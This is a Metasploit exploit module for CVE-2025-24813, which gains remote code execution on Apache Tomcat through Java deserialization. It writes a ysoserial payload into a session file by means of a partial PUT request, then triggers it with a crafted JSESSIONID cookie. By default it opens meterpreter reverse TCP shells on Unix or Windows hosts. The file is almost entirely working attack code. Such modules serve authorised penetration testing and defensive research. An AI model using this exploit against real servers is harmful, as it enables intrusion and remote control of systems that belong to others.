##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::JavaDeserialization

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Tomcat Partial PUT Java Deserialization',
        'Description' => %q{
          This module exploits a Java deserialization vulnerability in Apache
          Tomcats's session restoration functionality that can be exploited with a partial PUT
          to place an attacker controlled deserialisazion payload in the work directory.

          For the exploit to succeed, writes must be enabled for the default servlet,
          and org.apache.catalina.session.PersistentManager must be configured to use
          org.apache.catalina.session.FileStore.

          Verified working on XXX
        },
        'Author' => [
          'sw0rd1ight', # Discovery
          'Calum Hutton', # Exploit
        ],
        'References' => [
          ['CVE', '2025-24813'],
          ['URL', 'https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2025-24813'],
        ],
        'DisclosureDate' => '2025-03-10', # Vendor release note
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux', 'win'],
        'Arch' => [ARCH_CMD],
        'Privileged' => false,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse_tcp' }
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD,
              'Type' => :windows_cmd,
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/powershell/meterpreter/reverse_tcp' }
            }
          ],
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'SSL' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      Opt::RPORT(8080),
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('GADGET', [true, 'ysoserial gadget', 'CommonsBeanutils1']),
    ])
  end

  def check
    # Basic check to identify write enabled servers.
    # Try to DELETE a random nonexistent file
    # (Can only confirm that write ops are enabled,
    # not that the PersistentManager is configured to
    # use FileStore)
    request = {
      'method' => 'DELETE',
      'uri' => normalize_uri(target_uri.path, Rex::Text.rand_text_alpha(10))
    }
    res = send_request_cgi(request)
    if res && res.code != 405
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    execute_command(payload.encoded)
  end

  def execute_command(cmd, _opts = {})
    # Determine the shell
    case target['Platform']
    when 'unix', 'linux'
      shell = 'bash'
    when 'win'
      shell = 'cmd'
    else
      fail_with(Failure::NoTarget, 'Unsupported target platform!')
    end

    session_id = Rex::Text.rand_text_alpha(10)
    session_file = "#{session_id}.session"

    print_status("Utilizing #{datastore['GADGET']} deserialization chain")
    print_status("Uploading ysoserial payload (#{session_file}) via partial PUT")
    res = send_partial_put(
      generate_java_deserialization_for_command(datastore['GADGET'].to_s, shell, cmd),
      session_file
    )

    upload_success_codes = [201, 409]
    unless res && upload_success_codes.include?(res.code)
      fail_with(Failure::UnexpectedReply, "Failed to upload payload: #{res.code}")
    end

    # Request the session id to retrieve the file and trigger deserialization
    request = {
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path),
      'headers' => { 'Cookie' => "JSESSIONID=.#{session_id}" }
    }

    print_status("Attempting to deserialize session file: #{session_id}")
    res = send_request_cgi(request)
    unless res && res.code == 500
      fail_with(Failure::UnexpectedReply, "Failed to deserialize session: #{res.code}")
    end

    print_good('500 error response usually indicates success :)')
  end

  def send_partial_put(data, name)
    request = {
      'method' => 'PUT',
      'uri' => normalize_uri(target_uri.path, name),
      'headers' => { 'Content-Range' => 'bytes 0-5/100' },
      'data' => data
    }
    send_request_cgi(request)
  end

end
